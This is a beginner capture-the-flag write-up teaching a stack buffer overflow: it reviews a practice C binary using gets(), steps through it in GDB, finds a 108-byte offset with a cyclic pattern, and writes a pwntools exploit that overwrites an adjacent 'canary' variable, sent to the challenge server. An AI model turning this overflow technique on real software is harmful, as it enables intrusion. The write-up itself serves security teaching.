# CTF101 - Binary Exploitation (3)
> author: [@gatari](https://github.com/gatariee) & [@duckupus](https://github.com/duckupus)

_continuation of the infant pwn challenge from [CTF101](https://ctf.gryphons.sg/)_

## Code Review
At first glance, something stands out from the `vuln` binary:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

void win() {
    ... bla bla ...
    // print out the flag
    ... bla bla ...
}

void lose() {
    printf( "Sorry, try again\n" );
    exit( 1 );
}

void vuln() {
    int  canary = 0xdeadbeef;
    char overflow_me[100];

    printf( "[-] canary set to: %p\n", canary );
    printf( "overflow me plz: " );

    gets( overflow_me );

    printf( "value of canary now: %p\n", canary );
    if ( canary != 0xdeadbeef ) {
        win();
    } else {
        lose();
    }
}

int main( int argc, char ** argv ) {

    setbuf( stdin, 0 );
    setbuf( stdout, 0 );

    vuln();

    return 0;
}
```

A variable `canary` is set to `0xdeadbeef`, and after some user input, the value of `canary` is checked; but this time the `canary` should no longer be `0xdeadbeef`. How is this possible?!

## Smashing the Stack
We'll not be going through how stack layouts work, and how the stack is laid out in memory, but you **should** have a decent understanding of how the stack works before continuing.

* https://ctf101.org/binary-exploitation/what-is-the-stack/

* https://guyinatuxedo.github.io/04-bof_variable/csaw18_boi/index.html

If you know a little bit about pwn, you'd very quickly see the `gets()` function in the `vuln` function. This function is **very** dangerous, as it doesn't check the size of the input, and will happily write past the buffer if the input is too large.

A buffer `overflow_me` is declared with a size of `100`, and `gets()` is called to pass user input into the buffer. If the user input is larger than `100`, the buffer will overflow, and start overwriting the stack.

Here's a super dumbed down version of what the stack looks like before an overflow (pardon the dumb art, the stack actually grows in the opposite direction):

![stack_1](https://i.gyazo.com/f2c44a32c02ee15af1da86b4e4b3d26f.png)

And here's what the stack looks like after an overflow:

![stack_2](https://i.gyazo.com/a0013572f8721c3febfc8ef074c344aa.png)

The `canary` variable is stored right after the buffer `overflow_me`, and if we overflow the buffer, we can overwrite the `canary` variable, and change its value to something else.

## Manual Exploitation
The solution is pretty simple, we just need to overflow the buffer with enough characters to fully occupy the buffer allocated for `overflow_me` (100 bytes), and then continue writing to overwrite the `canary` variable.

Let's just send garbage over the length of 100 bytes.

## GDB
Let's step through this challenge with a debugger, and do it more "methodically".
```sh
gdb ./vuln
```

We can list all the functions in the binary with:
```sh
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init

0x0000000000401375  main
0x00000000004013c0  _fini
```

We can disassemble the `vuln` function with:
```sh
pwndbg> disassemble vuln

End of assembler dump.
```

The first thing we can look for is familiar function calls, immediately we can see that `gets()` is called at `0x0000000000401335` and the value passed into `gets()` is stored in `[rbp-0x70]`
```
0x0000000000401329 <+60>:    lea    rax,[rbp-0x70]
0x000000000040132d <+64>:    mov    rdi,rax
0x0000000000401330 <+67>:    mov    eax,0x0
0x0000000000401335 <+72>:    call   0x4010a0 <gets@plt>
```

We can verify this with the following command:
```sh
gdb ./vuln
b *0x000000000040133a # ;; 0x000000000040133a <+77>:    mov    eax,DWORD PTR [rbp-0x4]
r
```

We hit our breakpoint here.

![a](https://i.gyazo.com/e1f601a14c07edbd3ce531e9e1419493.png)

We can print out the value of `overflow_me` (currently in `rax`) but points to `[rbp-0x70]`:
```sh
pwndbg> x/s $rax
    0x7fffffffdca0: "hello world"
    
pwndbg> x/s $rbp-0x70
    0x7fffffffdca0: "hello world"
```

![b](https://i.gyazo.com/c0046128e1731205cc4b11b6a9501b40.png)

We can continue to step through the program with:
```sh
s # ;; step
```

Let's continue stepping until we reach the call to `printf` at `0x40134e`

```sh
   0x40133a <vuln+77>     mov    eax, dword ptr [rbp - 4]
   0x40133d <vuln+80>     mov    esi, eax
   0x40133f <vuln+82>     lea    rax, [rip + 0xd83]
   0x401346 <vuln+89>     mov    rdi, rax
   0x401349 <vuln+92>     mov    eax, 0
 ► 0x40134e <vuln+97>     call   printf@plt                      <printf@plt>
        format: 0x4020c9 ◂— 'value of canary now: %p\n'
        vararg: 0xdeadbeef
```

![a](https://i.gyazo.com/4b2a62949f771a6a8ce91407c7ed7d6a.png)

We'll see that the value of the canary is being printed out, that's convenient but what we're interested in is the `cmp` instruction (the next instruction) that checks if the canary is `0xdeadbeef`.
```sh
0x401353 <vuln+102>    cmp    dword ptr [rbp - 4], 0xdeadbeef
```

We can set a breakpoint at this instruction, and continue stepping through the program.
```sh
b *0x0000000000401353 # ;; cmp    DWORD PTR [rbp-0x4],0xdeadbeef
r
```

We hit our breakpoint here, let's print out the value of the canary.
```sh
pwndbg> x/x $rbp-4
0x7fffffffdd4c: 0xdeadbeef
```

![a](https://i.gyazo.com/baadab432debdbaf5c77bbaecf575131.png)

If you continue to step through, you'll quickly see that the return value of the `cmp` is passed into a `je` (jump if equal) instruction.

```sh
 ► 0x401353 <vuln+102>    cmp    dword ptr [rbp - 4], 0xdeadbeef
   0x40135a <vuln+109>    je     vuln+123                      <vuln+123>
    ↓
   0x401368 <vuln+123>    mov    eax, 0
   0x40136d <vuln+128>    call   lose                      <lose>
```

![a](https://i.gyazo.com/72cea112196e96ee4bea8c90c582783e.png)

The following code-
```sh
if ( canary != 0xdeadbeef ) {
    win();
} else {
    lose();
}
```
Roughly translates to:
```sh
lose:
    printf( "Sorry, try again\n" );
    ret; 

win:
    ... bla bla ...
    # print out the flag
    ... bla bla ...

cmp [$canary], 0xdeadbeef; # ;; check if the canary is equal to 0xdeadbeef

je addr(lose);             # ;; if the canary is equal to 0xdeadbeef, jump to lose()

win;                       # ;; since no jump was hit, we continue to win()
```

Let's continue walking through the program, till we hit the `je` instruction.
```sh
   0x401353 <vuln+102>    cmp    dword ptr [rbp - 4], 0xdeadbeef
   0x40135a <vuln+109>    je     vuln+123                      <vuln+123>
    ↓
   0x401368 <vuln+123>    mov    eax, 0
 ► 0x40136d <vuln+128>    call   lose                      <lose>
        rdi: 0x7fffffffdb00 —▸ 0x7fffffffdb30 ◂— 'value of canary now: 0xdeadbeef\n'
        rsi: 0x7fffffffdb30 ◂— 'value of canary now: 0xdeadbeef\n'
        rdx: 0x0
        rcx: 0x0
```

![a](https://i.gyazo.com/6568fcc62b80f29f76281a49c0b4dfb8.png)

As expected, we hit the `lose` function, and the program exits in a couple of instructions.

### Smashing the Stack (GDB)
Let's try smashing the stack again, but walking through it with GDB this time.

```sh
python3 -c 'print("A"*120)' > payload
gdb ./vuln
b *0x0000000000401353 # ;; cmp    DWORD PTR [rbp-0x4],0xdeadbeef
r < payload
```
After hitting our breakpoint, let's print out the value of the canary.
```sh
pwndbg> x/x $rbp-4
0x7fffffffdd4c: 0x41414141
pwndbg> x/s $rbp-4
0x7fffffffdd4c: 'A' <repeats 12 times>
```

![a](https://i.gyazo.com/447ca377ec9ce9d999a9a91bde19e78a.png)

And, our canary has been overwritten with `0x41414141` or A's and it is no longer equal to `0xdeadbeef`.

### Controlling the Stack
We managed to overwrite the canary, but what's next? Well, for this challenge there _is_ no next step. But in a hypothetical scenario, what if we wanted to accurately control the value of the canary?

#### Cyclic Pattern
We can use a cyclic pattern to determine the offset at which the canary is overwritten. We can generate a cyclic pattern with `gdb` if you have `pwndbg` installed:
```sh
cyclic [length]
```

Let's generate a cyclic pattern of length `120` with a new pattern every 4 characters.
```sh
pwndbg> cyclic 120 -n 4
aabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbbcbdbebfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzccdcecfcgchcicjckclc
```

Let's setup our breakpoints again, and run the binary with the cyclic pattern.
```sh
gdb ./vuln
cyclic 120 -n 4
b *0x0000000000401353 # ;; cmp    DWORD PTR [rbp-0x4],0xdeadbeef
r
```

After hitting our breakpoint, let's print out the value of the canary.
```sh
pwndbg> x/x $rbp-4
0x7fffffffdd4c: 0x62616163
```

And, now we can calculate which point in the cyclic pattern the canary was overwritten.
```sh
pwndbg> cyclic -l 0x62616163 -n 4
Finding cyclic pattern of 4 bytes: b'caab' (hex: 0x63616162)
Found at offset 108
```

![a](https://i.gyazo.com/ab9bad523db852e8ee0e8f0b17494e13.png)

After **108** bytes, we have control over the value of the canary.

To illustrate this, let's generate a new payload with the canary set to `BBBB` instead (the hex value of `B` is 0x42)
```sh
python3 -c 'print("A"*108 + "BBBB")' > payload
```

Let's run the binary with this new payload.
```sh
gdb ./vuln
b *0x0000000000401353 # ;; cmp    DWORD PTR [rbp-0x4],0xdeadbeef
r < payload
```

After hitting our breakpoint, let's print out the value of the canary.
```sh
pwndbg> x/x $rbp-4
0x7fffffffdd4c: 0x42424242

pwndbg> x/s $rbp-4
0x7fffffffdd4c: "BBBB"
```

As expected, we've successfully overwritten the canary with `0x42424242` or `BBBB`.

### Pwntools
You may have noticed that I've been running python3 one-liners to generate payloads, and it's a bit of a hassle to keep running the same command over and over again. This is where `pwntools` comes in.

This is a pretty basic template that I like to use when I'm working with `pwntools`:
```python
from pwn import *

exe               = ELF ( './vuln' )
context.binary    = exe
context.log_level = 'info'


if args.REMOTE:
    io = remote ( '127.0.0.1', 5000 )
else:
    io = process ( exe.path )

"""
====================================
    IGNORE ABOVE CODE (SETUP)
====================================
"""

... your code here ...
```

`pwntools` allows you to interact with binaries, both locally and remotely, and it has a lot of useful functions that make binary exploitation a lot easier.

Let's check out how `pwntools` interacts remotely using a simple `netcat` listener.

On a terminal, run the following command:
```sh
nc -lnvp 1337
```

On another terminal, run the following python script with the `REMOTE` argument:
```python
from pwn import *

# exe               = ELF ( './vuln' )
# context.binary    = exe
context.log_level = 'info'


if args.REMOTE:
    io = remote ( '127.0.0.1', 1337 ) # ;; change this to whatever
else:
    io = process ( exe.path )

"""
====================================
    IGNORE ABOVE CODE (SETUP)
====================================
"""

io.sendline( b"Hello from Pwntools!" )
io.interactive()
```
![pwntools](https://i.gyazo.com/cb39ed16da24669e356d7d9dc8964bbe.png)

### Exploitation (Pwntools)
Let's craft that exploit again and send it locally via `pwntools` (no arguments):

```python
from pwn import *

exe               = ELF ( './vuln' )
context.binary    = exe
context.log_level = 'info'


if args.REMOTE:
    io = remote ( '127.0.0.1', 5000 )
else:
    io = process ( exe.path )

"""
====================================
    IGNORE ABOVE CODE (SETUP)
====================================
"""

OFFSET = 108

payload  = b"A" * OFFSET
payload += b"BBBB"

io.sendline( payload )
io.interactive()
```

Run it with: `python3 exploit.py` (local)

![a](https://i.gyazo.com/9aa381be7d2c7482294d50e9cc4e6004.png)

And, we've successfully overwritten the canary with `BBBB`.

## "Remote" (Local Container)
Let's try running the exploit "remotely", by specifying the `REMOTE` argument and changing this line: ` io = remote ( '[ip]', [port] ) `

Since our local container is running at: `127.0.0.1:5000`, we can change the line to: `io = remote ( '127.0.0.1', 5000 )`
```python
from pwn import *

exe               = ELF ( './vuln' )
context.binary    = exe
context.log_level = 'info'


if args.REMOTE:
    io = remote ( '127.0.0.1', 5000 )
else:
    io = process ( exe.path )

"""
====================================
    IGNORE ABOVE CODE (SETUP)
====================================
"""

OFFSET = 108

payload  = b"A" * OFFSET
payload += b"BBBB"

io.sendline( payload )
io.interactive()
```

![local](https://i.gyazo.com/da7ab66e69f7949ac3e7163f8c249159.png)

## Remote (Real)
The actual challenge is hosted at: `nc chal1.gryphons.sg 10004` so let's change this to: `io = remote ( 'chal1.gryphons.sg', 10004 )`

![a](https://i.gyazo.com/83a50307245d826c92de38e9a88d6892.png)

### What's Next?
For CTF101, the next logical progression from `infant pwn` would be `toddler pwn`; happy hunting~
